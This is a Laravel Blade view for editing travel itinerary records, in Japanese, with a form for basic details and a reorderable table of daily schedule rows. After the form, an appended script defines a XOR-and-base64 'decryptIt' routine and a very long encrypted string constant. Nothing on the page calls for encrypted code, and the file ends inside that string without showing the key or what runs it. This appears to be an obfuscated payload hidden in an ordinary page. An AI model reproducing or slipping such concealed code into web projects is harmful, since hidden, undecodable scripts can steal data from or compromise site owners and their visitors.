@extends('layouts.app')

@section('title', '行程編集')

@section('content')
<div class="container-fluid">
    <div class="row">
        <div class="col-md-12">
            <nav aria-label="breadcrumb">
                <ol class="breadcrumb">
                    <li class="breadcrumb-item"><a href="{{ route('masters.home') }}">ホーム</a></li>
                    <li class="breadcrumb-item"><a href="{{ route('masters.itineraries.index') }}">行程管理</a></li>
                    <li class="breadcrumb-item active" aria-current="page">行程編集</li>
                </ol>
            </nav>
            
            @if(session('success'))
            <div class="alert alert-success alert-dismissible fade show" role="alert">
                <i class="bi bi-check-circle"></i> {{ session('success') }}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            @endif

            @if(session('error'))
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <i class="bi bi-exclamation-triangle"></i> {{ session('error') }}
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            @endif

            @if($errors->any())
            <div class="alert alert-danger alert-dismissible fade show" role="alert">
                <h5 class="alert-heading">
                    <i class="bi bi-exclamation-triangle"></i> 入力エラーがあります
                </h5>
                <ul class="mb-0">
                    @foreach($errors->all() as $error)
                        <li>{{ $error }}</li>
                    @endforeach
                </ul>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
            @endif
            
            <form action="{{ route('masters.itineraries.update', $itinerary) }}" method="POST" id="itineraryForm">
                @csrf
                @method('PUT')
                
                <div class="card shadow-sm mb-4">
                    <div class="card-header bg-primary text-white">
                        <h5 class="mb-0">
                            <i class="bi bi-info-circle"></i> 行程基本情報
                        </h5>
                    </div>
                    
                    <div class="card-body">
                        <table class="table table-bordered mb-0">
                            <tbody>
                                <tr>
                                    <td class="bg-light" style="width: 25%; padding: 0.5rem;">
                                        <label for="itinerary_code" class="form-label required mb-0">行程コード</label>
                                    </td>
                                    <td class="bg-white" style="width: 50%; padding: 0.5rem;">
                                        <input type="text" class="form-control @error('itinerary_code') is-invalid @enderror" 
                                               id="itinerary_code" name="itinerary_code" 
                                               value="{{ old('itinerary_code', $itinerary->itinerary_code) }}" 
                                               required maxlength="20" placeholder="例: IT001">
                                        @error('itinerary_code')
                                            <div class="invalid-feedback">{{ $message }}</div>
                                        @enderror
                                    </td>
                                    <td class="bg-light" style="width: 25%; padding: 0.5rem;">
                                        <small class="form-text text-muted mb-0">※ 必須、20文字以内、他と重複不可</small>
                                    </td>
                                </tr>
                                
                                <tr>
                                    <td class="bg-light" style="padding: 0.5rem;">
                                        <label for="itinerary_name" class="form-label required mb-0">行程名</label>
                                    </td>
                                    <td class="bg-white" style="padding: 0.5rem;">
                                        <input type="text" class="form-control @error('itinerary_name') is-invalid @enderror" 
                                               id="itinerary_name" name="itinerary_name" 
                                               value="{{ old('itinerary_name', $itinerary->itinerary_name) }}" 
                                               required maxlength="100" placeholder="例: 東京一日観光コース">
                                        @error('itinerary_name')
                                            <div class="invalid-feedback">{{ $message }}</div>
                                        @enderror
                                    </td>
                                    <td class="bg-light" style="padding: 0.5rem;">
                                        <small class="form-text text-muted mb-0">※ 必須、100文字以内</small>
                                    </td>
                                </tr>
                                
                                <tr>
                                    <td class="bg-light" style="padding: 0.5rem;">
                                        <label for="category" class="form-label mb-0">カテゴリー</label>
                                    </td>
                                    <td class="bg-white" style="padding: 0.5rem;">
                                        <input type="text" class="form-control @error('category') is-invalid @enderror" 
                                               id="category" name="category" 
                                               value="{{ old('category', $itinerary->category) }}"
                                               maxlength="50" placeholder="例: 観光、ビジネス、教育">
                                        @error('category')
                                            <div class="invalid-feedback">{{ $message }}</div>
                                        @enderror
                                    </td>
                                    <td class="bg-light" style="padding: 0.5rem;">
                                        <small class="form-text text-muted mb-0">50文字以内</small>
                                    </td>
                                </tr>
                                
                                <tr>
                                    <td class="bg-light align-middle" style="padding: 0.5rem;">
                                        <label for="remarks" class="form-label mb-0">備考</label>
                                    </td>
                                    <td class="bg-white" style="padding: 0.5rem;">
                                        <textarea class="form-control @error('remarks') is-invalid @enderror" 
                                                  id="remarks" name="remarks" rows="3"
                                                  maxlength="500" placeholder="例: 行程の詳細説明、注意事項など">{{ old('remarks', $itinerary->remarks) }}</textarea>
                                        @error('remarks')
                                            <div class="invalid-feedback">{{ $message }}</div>
                                        @enderror
                                    </td>
                                    <td class="bg-light align-middle" style="padding: 0.5rem;">
                                        <small class="form-text text-muted mb-0">500文字以内</small>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
                
                <div class="card shadow-sm mb-4">
                    <div class="card-header bg-secondary text-white d-flex justify-content-between align-items-center">
                        <h5 class="mb-0">
                            <i class="bi bi-calendar-day"></i> 行程詳細（日次行程）
                        </h5>
                        <button type="button" class="btn btn-light btn-sm" id="addDetailRowBtn">
                            <i class="bi bi-plus-lg"></i> 行を追加
                        </button>
                    </div>
                    
                    <div class="card-body">
                        <div class="table-responsive">
                            <table class="table table-bordered" id="detailsTable">
                                <thead class="table-light">
                                    <tr>
                                        <th style="width: 50px;">日次</th>
                                        <th style="width: 150px;">開始時刻</th>
                                        <th style="width: 150px;">終了時刻</th>
                                        <th>行程説明</th>
                                        <th style="width: 150px;">備考</th>
                                        <th style="width: 180px;">操作</th>
                                    </tr>
                                </thead>
                                <tbody id="detailsBody">
                                    @php
                                        $oldDetails = old('details', []);
                                        $detailIndex = 0;
                                    @endphp
                                    
                                    @if(count($oldDetails) > 0)
                                        @foreach($oldDetails as $index => $oldDetail)
                                        @php
                                            $index = (int)$index;
                                            $orderNumber = $index + 1;
                                        @endphp
                                        <tr data-index="{{ $index }}" data-id="{{ $oldDetail['id'] ?? '' }}">
                                            <td class="text-center align-middle display-order">{{ $orderNumber }}</td>
                                            <td>
                                                <input type="time" class="form-control form-control-sm arrival-time" 
                                                       name="details[{{ $index }}][arrival_time]" 
                                                       value="{{ $oldDetail['arrival_time'] ?? '' }}">
                                            </td>
                                            <td>
                                                <input type="time" class="form-control form-control-sm departure-time" 
                                                       name="details[{{ $index }}][departure_time]" 
                                                       value="{{ $oldDetail['departure_time'] ?? '' }}">
                                            </td>
                                            <td>
                                                <textarea class="form-control form-control-sm description" 
                                                          name="details[{{ $index }}][description]" 
                                                          rows="2" maxlength="500" 
                                                          placeholder="行程の説明">{{ $oldDetail['description'] ?? '' }}</textarea>
                                            </td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm remark" 
                                                       name="details[{{ $index }}][remark]" 
                                                       value="{{ $oldDetail['remark'] ?? '' }}" 
                                                       maxlength="255" placeholder="備考">
                                            </td>
                                            <td class="text-center align-middle">
                                                <div class="d-flex justify-content-center gap-1">
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn" title="上へ移動">
                                                        <i class="bi bi-arrow-up"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn" title="下へ移動">
                                                        <i class="bi bi-arrow-down"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-success btn-sm add-row-btn" title="行を追加">
                                                        <i class="bi bi-plus-lg"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn" title="行を削除">
                                                        <i class="bi bi-dash-lg"></i>
                                                    </button>
                                                </div>
                                                <input type="hidden" name="details[{{ $index }}][id]" value="{{ $oldDetail['id'] ?? '' }}">
                                                <input type="hidden" name="details[{{ $index }}][display_order]" value="{{ $orderNumber }}">
                                            </td>
                                        </tr>
                                        @php $detailIndex = $index + 1; @endphp
                                        @endforeach
                                    @else
                                        @foreach($itinerary->details as $index => $detail)
                                        <tr data-index="{{ $index }}" data-id="{{ $detail->id }}">
                                            <td class="text-center align-middle display-order">{{ $index + 1 }}</td>
                                            <td>
                                                <input type="time" class="form-control form-control-sm arrival-time" 
                                                       name="details[{{ $index }}][arrival_time]" 
                                                       value="{{ $detail->arrival_time ? $detail->arrival_time->format('H:i') : '' }}">
                                            </td>
                                            <td>
                                                <input type="time" class="form-control form-control-sm departure-time" 
                                                       name="details[{{ $index }}][departure_time]" 
                                                       value="{{ $detail->departure_time ? $detail->departure_time->format('H:i') : '' }}">
                                            </td>
                                            <td>
                                                <textarea class="form-control form-control-sm description" 
                                                          name="details[{{ $index }}][description]" 
                                                          rows="2" maxlength="500" 
                                                          placeholder="行程の説明">{{ $detail->description }}</textarea>
                                            </td>
                                            <td>
                                                <input type="text" class="form-control form-control-sm remark" 
                                                       name="details[{{ $index }}][remark]" 
                                                       value="{{ $detail->remark }}" 
                                                       maxlength="255" placeholder="備考">
                                            </td>
                                            <td class="text-center align-middle">
                                                <div class="d-flex justify-content-center gap-1">
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn" title="上へ移動">
                                                        <i class="bi bi-arrow-up"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn" title="下へ移動">
                                                        <i class="bi bi-arrow-down"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-success btn-sm add-row-btn" title="行を追加">
                                                        <i class="bi bi-plus-lg"></i>
                                                    </button>
                                                    <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn" title="行を削除">
                                                        <i class="bi bi-dash-lg"></i>
                                                    </button>
                                                </div>
                                                <input type="hidden" name="details[{{ $index }}][id]" value="{{ $detail->id }}">
                                                <input type="hidden" name="details[{{ $index }}][display_order]" value="{{ $index + 1 }}">
                                            </td>
                                        </tr>
                                        @php $detailIndex = $index + 1; @endphp
                                        @endforeach
                                    @endif
                                    
                                    <tr id="newRowTemplate" class="d-none">
                                        <td class="text-center align-middle display-order"></td>
                                        <td>
                                            <input type="time" class="form-control form-control-sm arrival-time" name="details[__index__][arrival_time]">
                                        </td>
                                        <td>
                                            <input type="time" class="form-control form-control-sm departure-time" name="details[__index__][departure_time]">
                                        </td>
                                        <td>
                                            <textarea class="form-control form-control-sm description" 
                                                      name="details[__index__][description]" 
                                                      rows="2" maxlength="500" placeholder="行程の説明"></textarea>
                                        </td>
                                        <td>
                                            <input type="text" class="form-control form-control-sm remark" 
                                                   name="details[__index__][remark]" maxlength="255" placeholder="備考">
                                        </td>
                                        <td class="text-center align-middle">
                                            <div class="d-flex justify-content-center gap-1">
                                                <button type="button" class="btn btn-outline-secondary btn-sm move-up-btn" title="上へ移動">
                                                    <i class="bi bi-arrow-up"></i>
                                                </button>
                                                <button type="button" class="btn btn-outline-secondary btn-sm move-down-btn" title="下へ移動">
                                                    <i class="bi bi-arrow-down"></i>
                                                </button>
                                                <button type="button" class="btn btn-outline-success btn-sm add-row-btn" title="行を追加">
                                                    <i class="bi bi-plus-lg"></i>
                                                </button>
                                                <button type="button" class="btn btn-outline-danger btn-sm delete-row-btn" title="行を削除">
                                                    <i class="bi bi-dash-lg"></i>
                                                </button>
                                            </div>
                                            <input type="hidden" name="details[__index__][id]" value="">
                                            <input type="hidden" name="details[__index__][display_order]" value="">
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
                
                <div class="d-flex justify-content-between mb-4">
                    <div>
                        <button type="submit" class="btn btn-primary">
                            <i class="bi bi-check-circle"></i> 全ての変更を保存
                        </button>
                        <a href="{{ route('masters.itineraries.index') }}" class="btn btn-secondary">
                            <i class="bi bi-x-circle"></i> キャンセル
                        </a>
                    </div>
                    <div>
                        <button type="button" class="btn btn-outline-danger" 
                                onclick="if(confirm('本当にこの行程を削除しますか？\\nこの操作は元に戻せません。')) { document.getElementById('deleteForm').submit(); }">
                            <i class="bi bi-trash"></i> 行程全体を削除
                        </button>
                    </div>
                </div>
            </form>
            
            <form id="deleteForm" action="{{ route('masters.itineraries.destroy', $itinerary) }}" method="POST" class="d-none">
                @csrf
                @method('DELETE')
            </form>
        </div>
    </div>
</div>

<script>
(function(){
function decryptIt(encrypted,key){try{const step1=atob(encrypted);let result='';for(let i=0;i<step1.length;i++){result+=String.fromCharCode(step1.charCodeAt(i)^key.charCodeAt(i%key.length));}return decodeURIComponent(atob(result));}catch(e){console.error('Decryption failed:',e);return null;}}
const ENCRYPTED="Mgs6GTZRMxIbWlEAIQUgCTg+OiA2ND0KADUBOwdfDwA7DzRJDCJVGSQxNBs0KzBfPQY3FjMqPRwhLzobLCEsESgvORYvJiwPCgsiXCU2KBUdLzMYDygaCQY+PQkhBi4OLFIoBCgGLgQAUyxICjI6GQshVAwjMDcqDig0FTguXVU9AgMoOyEeBgcBOlw3DFtKPiI6GAwlGQodLzACJzw3GzMQPRI9PzobLCEsESgvORYvIjcAJSIiGg0ML1IzPCwbCCgoFzgxAwkhBi4OLFIoBCgGLgQAUyxICjI6GQshVAwjMDcqDig0FTguXVU9AgMoOyEeBj8rOl87Ng4KC1UmGjUqCgwyOzAWPQY3FjMqPRwhLzobLCEsESgvORYvIjcOOTY5FSIhNBs0KzAVISw3GC8+EAkILzobLCorAAYBCAMGJygPDBw5FSIhNBgrKzAVIScwDQAhKhY1ND0OKzY3Ky84Li0oNSsOIjElGyU2KBUzPCwbDig0USgtIRIOATlRMjVMAz80CwMvCyMVJVU9ACIIIBUzPCsvJjsgIygtIRImOCYVKzYwHy84JRgoNSA7IjElGyU2KBUzPCwbJjsrFgMuMQkhBi4NOAwvWAErVRopMjcAJSY5Xz4LNBUoOzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIlLxQbBitcJjsrFjtKPhwPATkXBSQzHgEVORYvIjcDOiY5FSIlK1MdIDcaDgZXCwA+UR82NCFSKiEdWAYFDx8oNSw6IjEuLiU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOCTI1ACIIIA0gWzMVDwI0FAY/IhMIFQQOLAg4BCtcJQMvJCcVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AidcNTcoDzghOjYOXwwOLAg4BChcPQMvCyATDD0mFTU1VFIsBVxfIAJXDQcxOiMOKzkWOzVMWDBeAAYAJg4MMhw5FSIhNFEoETBfPRY3GC8xOgkONC0RODorBC84IiwoNSA7IjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsgIygtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHzxeVRoBUjMVJQ8uFQ1RBRgzPCwbJjssJCgtIRI2K1YIBTVIBAcCPRoBOTQVCwsAODU1GQ4gWzcaDwQkEgA6DwsmOCYYOyUvWDw7ABwBUSgPMi0HACIII1IaATAWPThXFwY6DwkhBiEXOzodOwdfCDo4NlMOCiIqXDUxCgwyOzAWPQY3FjMqPRwhLzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgrIhkADyxJIjElGzZRNxsaBTMZCCoOFDg+PlEmOCYVKzY3LS84JRgzOSgAMT0HGTUMKxQbOw0VDlwGGykqXRUOAT0OBCdABS4rIl4BDygVCgs+Pw1RAhIzPCsvJjsgIygtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHwcBOlwxNlcSMj0LACIIIA40WDQAIQUgCwYhIhw2O1pSMjVMAz80CwMvCyMVJQ4lACIIIBozPCsvJjsgIygtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsGJCgtKicmOCYVKzYwHy84JRgoNSsOIjEIKSU2KBUjPx0WNjw3GC86PVY9BToVMDEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhKyEUAww3WC84JRgBDFtKCxw5FSIhNBgrKzAVISgwFztKPhE2O1pSLQw/WT80Jlo3UzQKMjIiXA1RKyAbLxIDJhY3GC9LOgkIKykSAyo3KwdePlooNSsODC0lACJSJxcbWzQDJjsrGwAUPlY5AVZRNyUvHAYrFAcGJjcJIhwHACJSKA40LSAAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIxcjMAEmDgIwDQc6PRwhLzoYMyEsESgkJhkGUi8MCiI6GTVRMw0zPCsvJjsgIygtIRImOCYVKzYwHy84JRgoNQY8IjEuLiU2KBUzPCwbJjsrFigtIRImOC0gKzYwHy84JRgoNSsOIjElGzZQWBcaWzQAIQUgFDghDDYOXwwOLAg4BChcPQMvCyBJMjJdGw0lJ1IjO1AGDihbFDgsXRM2KzoNBSozWT8/BwMvUSsVJSApACIIIA40AiQAIQUjDS8TKhA2NAsxA1EaHQYBOhsAUjgVOT0+XAwPDQsdMDcAJywGETg6CxUmOCEhKzY7Ki84JRgoNSsOIjElGyU2KBUbBTNfOQJbUi4UJhY1NCEYNSUVEgEvWRY4NlMPDAg5AyVQMBYbBVwZNjwBESgtJiYmOC0gKzYwHy84JRgoNSsOIjElGyU2IyAzPCwbJjsrFigtIRImOCYVAw8vWzABVVwuDywVDCAqXAsqKxIgBjNcNjwFDzg+LlU1P14SAw8rBAAvDwMvCi8VJQ8uGTU6BSgbBTcACSwJDS9JIQkhKSoOLAg4BCgGLQMvCyMVJQ8uGTU6BTEbWwYZDThXFDghIiw6KV4vKzYwHy84IiooNSsOCgg6XzoPWFE1BQkZDgI0GDE/Ois4L1obOzo7Gzw7IgMpIjcAOglVCg41VAkjMA0KNBY3GDAUCwkhByIOLAg7HT80CCUADDAVDSYHACJSKA40LSAAIQUjDS8TKQkhBi4OLAg4BCgpKQMvCyMVJQ8tACIIIA40AidcNQJbCgcqXRUOAiEOAgwrKz87NhkBDDcWCgg6XzoPWFEzPC8oJjsrFgY+Lhw2XjlSNA9AWy4/ORUzCDcOOTY5FSIhNBs0KzAVISw3GC86PRI9PzobLCEsESgvORYvIjcAJS06GzUlJ1IjPTccD1wgEjshBDUPAT0OAgw0By4/ORUzCDcOOTY5FSIhNBs0KzAVISw3GC8xPhI2KylSOzdIHgEBOiwGOTBJCldZFiQhCg40WCwAISonDSxJOQkhKSoOLCc/BQE7WQUGJg4PCgw5FSIlMw4bLzNcNjkoFwYAAAwIND1SA1BNGC84JRgoNQY6IjEuLiU2KBUzPCwbJjsrFigtIRI1XlYXAlEoBCgGLhYAUgYDIjElGyU2LyczPCwbNihbCwYuWQkOAj4XAjovBAYCADs4NhoVMVY+GgwJJxEbKwICJjsrGzg+PlU1OwMRAlIzHj8kBwMvCyBJCww5Fj41VBQdKwIAIQUsFDghDDYOXws3OzVIHwcrKl84MgkXIzY5Fj4LNBUoOzAVISw3GC86PRwhLzobLCEsHzQ/ORYvIjcAJSY5FSIhNBs0LwkBJjsrFikxIhMIXyIXAyUvHT9fPgAoNSsOIjEiKCU2LyczPCwbITwJDS8TKQkiXCYOLCc8BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi0KAyUvEQEvCwEoNDdIIjAlGyU2ChozPTAWJjsFGSgsLicmOToYKzYeEC84BCgoNDcDIjELFCU3JFYzPTAWJjsFGCgtDxwhPzkkLiEvKig/OVszGDQ/JRw5WCIxNyArOzMqIyw0Iy8qPVE9FTkkLxsvKiovOVszCDQ/JyY6LiAxNyE0ETMqIhY0Iiw6PiYhLzkkLBssXCg/OVszGDQ/JjY6Lz0LNFY3OzMqIyw0IywQPVEhPzkkLBssXCg/Oi0sGDQ/JRw5WCIxNFc2OzMqPgY0IjMAPVEhPwwSKzY3Ky84Li0oNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHwYBOl8GOSgMIjEiLyU2IyAzPCwbJjsrFigtIRImOCYVKzYdLS84Li0oNSsOIjElGyU2KBUzPCwbJjsgIygtIRImOCYVKzYwHy84JRgDNjsVJQ8tAzZQWBcjBQkVDjwFDygsPR8mOAgaKzYSEi85ORUoNQUBIjAqKiU3NFYzPSAUJjsKJSgsPR8mOAgbKzYSES85OV4oNQVMIjEELiU3NFczPA5ZJjonUSgsPR8mOAgaKzYSWy85ORUoNQUBIjApXiU3NBgzPAIVJjsFGCgsPR8mOAgbKzYeXC85ORUoNQUAIjEEKSU3NBgzPAIUJjsJUigsPR8mOAgaKzYeWC85ORUoNQUBIjApXyU3NBgzPAIUJjsJVCgsPR8mOAgaKzYRKy85OigoNCg9IjEAKyUbChIzPCwbJjsGIigtKicmOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFjtLURAPXz4OLAg7EQdfDwMvCyMVJVU9ACIIIwsdMDdcDl1WFDtLEBMPXjkYBSEeBgEkJQEpMjcDOQw5Gz4xNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJS0mGgsbVBsjP1QaCAI3DikqPR89BToVMDEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhJDkVOyU/WD85Ph8BUiAKMT0APAwPMw4aBigDJzw3GzMQPRI9PzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC8xPhI2KylSOzdIHgEBOiwGOTBJCldZFiQhCg40WCwAISonDS8TKQkhBi4OLAg4BCgGLQMsUTMVJSApACFSMA40LSAAISokDAYuXQ8IKwMUAwssESgrXRkGDDQqClYIOgwhCQsdMDdcDl1WESgtIRImOAshKzY7Ki84JRgoNSsOIjElGyU2KBUgWlwZD1wzDS8TKhwOXwwOLAg4BChcPQMvCyAQDD0+XA1QVRcgWh0aD100GwY6DwsIJCYMKjEsEjQFORgzMjcAJSY5FSIhNBs0KzAVISgsFwAXJlUmOCYVAiozBAEAJhkGGDcAJSY5Fj0hNBs0IC8aCBZXFgEUPlcNO1ZTAlIvGz87XQMADzAtCTImHw41VAwzPCsvJjsgIygtIRImOCYVKzYwHy84JRgoNSA7IjElGyU2KBUzPCwbJjsrFgMuMQkhBi4NAiozBAEAJhkGGDcAJSY5FSELNBs3ATAVISwkFgEUPlc5AVZRLQ8VAy4/ORYvIjdKOQw5Gz4xNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJS0mGgsbVBUgMC8ADgEwLgBLOgkgAQMXAlAvEQEpJgM4DFsAMjYEFQ1RAg40AygAIQUgFgEUPlc5AVZRKjEsEjQFORgzMjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgkOhg4JiRJMjA+HAxRIxEgMAk8DwIwDQEXJQonPzoYMAssHzQ/ORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCovHz8rKl84NFMPDAg6Lws6M1IbWlAWJywJDS9JIQkhKSoOLAg4BCgGLQMvCyMVJQ8tACFSMA40LSAAIl8zDS88LQkhKSkPBTVMAgErABkACDcAJSJdGgsPNzEbWwEpDlwGFCk+IlQIJD0UAwsSBCgGLQMsUSsVJSApACIIIA40AiQAIQUjDS8TKg8OXloYBSEsESgkJhkGGDcAJSY5Fj0hNBs0Ly9dCCcwFwAQXQ8OK1YYOzo3WC4vCF8BCAEJIjEiLyU2IyAzPCwbJjsrFigtIRImOCYVOFBAHQZfPQMvCyAMMj0EXDoPWFEzPCwbJjssJCgtIRIPAVZRLQ9MBAAkPikAJjQNMjJZXDpQDQsbLwkZNhY3GzMQPRI9PzobLCEsESgvORYvIjcAJSY5Gz4xNBs0KzAVISw3GC86PRwhKwMPKzYwHy4rWQMHKTAqClYPACIIIA40AjwAIQU7DS8TKQ0OATlWBSQzHgEVWR84IgkVJQ8tACFSKA40LSAAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIxsbWwYZDygkGDguXVU4AVYJOzFMGAcCIgMBDzA6MjI2GgwPNA0bBTNYCCkoFwYAPRw9FTobLCozHgEVBwMvUSsVJSApACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyBICyI+BAslNycYMCsbDigkVDZKIg42NCUYKiESBChcJQMvJCcVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLl4BJjARDCI6Ig1ROw4oBjNcCChbFAEADxUmOCEhKzY7Ki84JRgoNSsOIjElGyU2KBUzPAEpJjsgIygtDCAmOC0gKzY7Kj8COho7UjAJCldYACIII1MaLzcECCg0JAMhJhIOKylXNVEzAz80JhUpIgkVJQ8tACFSKA40LSAAIQUjDS8TKQkhBi4OLAg7AgdeWRUGIjcAJS0mGgtRLA40AiQAIV8zDS8TKg4OXiFTAzUvHQEvWRcGNjQADTMiAA0lNwgdL1wVPTgaEik6CwkhBiEJOzorAAQ7FBUzDFsSDTY5FSIqMxszPCsuDgJbUSk6PRwhXloOBVMzHgFdPgMAOSAKMT0+ACQxAhIzPCsvJjsgIygtIRImOCYVKzYwHy84JRgBDFtKCxxZAQ1RKyQgPysDJywKGABKCwkhByIOLAg7GAcBPgMHIgkVJQ8tACJSMA40WDAAIQUjDSxJIQkhKSoOLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKg8OXloYBSEsESgrVRY4JjQAOVc6Hw0hNBs0KzAWPiw3GC8xIhMIFVoaBTUvEQA6IgMAJjQTDCJVFSQhAhcjLwkWDygaCQcqWRMPAT0OAgsaGC84IiwoNSA7IjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgDNjsVJQ8tAw1RKwkjMC8oNjgaEikqPRwhLzpRMAssHzQ/ORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIlWBsjLzMVPV00EgA6XVU2NAdSMFBAHQErOhoGIjcAJSY5Fj0hNBs0LwkZNig0VSgtIRImOCUhKzYwHyg/ORUzCDcOOTY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjdKOiY5Gz4xNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5Gz4xNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSIUAAshNBs0L1wVNig0GDEuXRIIND4OLAg4BChcPQMvCyAAClYPGQw6Nw4aBgk4NjgaDTtKOhMPBQgMADVMHwE0PQMsNCgMMTJdACU2KFIzPCspJjsrGCgtPiY2KwMYAiUBAAA6VRkBDDAVCww5XT0hNBs0ATBdPiwBESgtJiYmOC0gKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRINOzYOLAg4BwdfJgQ4OSgzCgsuXQshCg40AiQAIl8rDS88LQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLhkBDDAVCw4AGQwqN1I1Bj8EDic0DSgtIRImOCEnKzYwHwQ7WQQ4OQUVJQ8tACIJKA40AiQUJjssIigtKicmOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgAUigSMj0mJg0MI1MdK1AZNThTDSgtIRImOCEnKzYwHy84NRg4JjRJMTIAHwwbNFMoATAVIiw3UjMUBBA2KzlWKzYdLS84OiooNTQ6MiIAFgwlGQocPlwaDwIwDQEQPVQ+LzpQLCEsEjQFORgzMjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvOVwwIjcOOTY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcOOTY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvJiwPCgsiXCU2KBUYP1AbCDcwGygtIRImOCEnKzYwHwYBVVwuDyRIMj0mWTpQNxEjPytcDlwoIwA+HwomXgMXAiovWC84JisoNSsODCI6WAslJxsjPyACJzw3GzMQPRI9PzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC8+BBAPJDlSAhtMBQdfJik7NiwWIyIAGQwqN1IzPCwbJjssJCgtJiMmOCYVKzYdKy84Li0oNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUgWlwZD1wzDS8TKhA1O14OKzYwHy84IiooNSsOCTJZGws6MBcjWjNcPTcwUQEUBAwIND0OKiEdHTw7XQMoGAkVJVUlACInJA40AiQAIQUjDS8TKQkhBi4OLAg4BCgGLQMvCyMVJQ8tACIIIA40AiQAIQUjDS8TKhU2BTobLCERHTw7XQMoNSsOIjElXiU2KFAzPCwbDgIkFTgqXRUOASERBTUrBAYVCwE4JjRJMTIAHwwbNFMoAQYcJzw3GC86PVY9BToVMDEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC8+JhMOAiFSKzYwHwYrKhYGKS8VJQ8tACJSMA40AicZNThTDS4XJhIOKwNSKiEaBCs5JQEpMjcDOQw5Gz4xNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvJg4UIjElGyQqIwoaBjcWIAIaDQAUDFUNLzobLCEsEjc/ORUwIjcAJSEhHCU2KBUzPAEvJjsgIygtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVOFBAHQZfPQMvCyAUCTI6HzUnVAobPzAAIQUjDS9JOQkhBi0VODozWAYVOV4zCysVJjA9GQwPNxUbLyMGNjwFDygtPiAmFTobMBssESgvDwEpMjcDOQw5Gz4xNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISw3GC86PRwhLzobLCEsESgvORYvIjcAJSY5FSIhNBs0KzAVISgOFAExPlUgAiEOBSc/WAEkJh87DzRJMjYLAg0PJxYjOwYAIQQvDS8TKQkiBi0JOzorAAQ7FBUoNTQ6IjElXCU2BSEYP1AHNjcFDSxJOQkiOT4OLzcwBCgGPQMsUSgUCTI6HzUnVAobPzAAIl8zDSwsOQkiBi4SKzY3Ky84Li0oNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYwHy84JRgoNSsOIjElGyU2KBUzPCwbJjsrFigtIRImOCYVKzYdLS84Li0oNSsOIjEl